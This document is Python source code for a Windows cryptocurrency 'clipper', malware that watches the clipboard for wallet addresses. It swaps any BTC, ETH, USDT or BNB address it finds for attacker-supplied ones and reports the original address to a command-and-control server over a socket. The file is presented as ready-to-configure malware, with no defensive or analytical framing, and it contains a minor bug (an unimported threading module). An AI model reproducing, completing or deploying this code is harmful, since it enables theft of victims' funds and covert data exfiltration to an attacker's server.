import time
import subprocess
import ctypes
import re
import os
import sys
import logging
import socket

# C2 Server Configuration
C2_HOST = '127.0.0.1'  # Replace with your C2 server's IP
C2_PORT = 4444         # Port to connect to

# Customizable Addresses (replace with your own)
BTC_ADDRESS = 'your_custom_btc_address_here'
ETH_ADDRESS = 'your_custom_eth_address_here'
USDT_ERC20_ADDRESS = 'your_custom_usdt_erc20_address_here'
USDT_TRC20_ADDRESS = 'your_custom_usdt_trc20_address_here'
BNB_ADDRESS = 'your_custom_bnb_address_here'

logging.basicConfig(format='[%(asctime)s] %(message)s', datefmt='%H:%M:%S', level=logging.DEBUG)

class Clipboard:
    def __init__(self):
        logging.debug('Clipboard initialized')
        self.kernel32 = ctypes.windll.kernel32
        self.user32 = ctypes.windll.user32

    def __enter__(self):
        self.user32.OpenClipboard(0)
        if self.user32.IsClipboardFormatAvailable(1):
            data = self.user32.GetClipboardData(1)
            data_locked = self.kernel32.GlobalLock(data)
            text = ctypes.c_char_p(data_locked)
            value = text.value
            self.kernel32.GlobalUnlock(data_locked)
            try:
                return value.decode()
            except Exception as e:
                logging.debug(e)
                return ''

    def __exit__(self, exc_type, exc_value, exc_traceback):
        self.user32.CloseClipboard()

class Methods:
    # Regex for top 5 cryptocurrencies
    regex = {
        'BTC': '^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}',
        'ETH': '^0x[a-fA-F0-9]{40}',
        'USDT_ERC20': '^0x[a-fA-F0-9]{40}',  # Same as ETH
        'USDT_TRC20': '^T[a-zA-HJ-NP-Z0-9]{33}',
        'BNB': '^(bnb1)[a-zA-HJ-NP-Z0-9]{38}'
    }

    @staticmethod
    def set_clipboard(text):
        logging.debug(f'Setting clipboard to: {text}')
        subprocess.check_call(f'echo {text.strip()} | clip', shell=True)

    def check(self, text):
        for crypto, pattern in self.regex.items():
            if re.match(pattern, text):
                logging.debug(f'Detected {crypto} address: {text}')
                return crypto
        return None

def send_to_c2(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((C2_HOST, C2_PORT))
            s.send(data.encode('utf-8'))
            logging.debug(f'Sent to C2: {data}')
    except Exception as e:
        logging.debug(f'Error sending to C2: {e}')

def monitor_clipboard():
    m = Methods()
    while True:
        with Clipboard() as clipboard:
            time.sleep(0.1)
            crypto_type = m.check(clipboard)
            if crypto_type:
                logging.debug(f'Original clipboard: {clipboard}')
                if crypto_type == 'BTC':
                    m.set_clipboard(BTC_ADDRESS)
                elif crypto_type == 'ETH':
                    m.set_clipboard(ETH_ADDRESS)
                elif crypto_type == 'USDT_ERC20':
                    m.set_clipboard(USDT_ERC20_ADDRESS)
                elif crypto_type == 'USDT_TRC20':
                    m.set_clipboard(USDT_TRC20_ADDRESS)
                elif crypto_type == 'BNB':
                    m.set_clipboard(BNB_ADDRESS)
                send_to_c2(clipboard)  # Send detected address to C2
        time.sleep(1)

def main():
    logging.debug('Starting Multi-Crypto Clipper')
    threading.Thread(target=monitor_clipboard, daemon=True).start()
    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()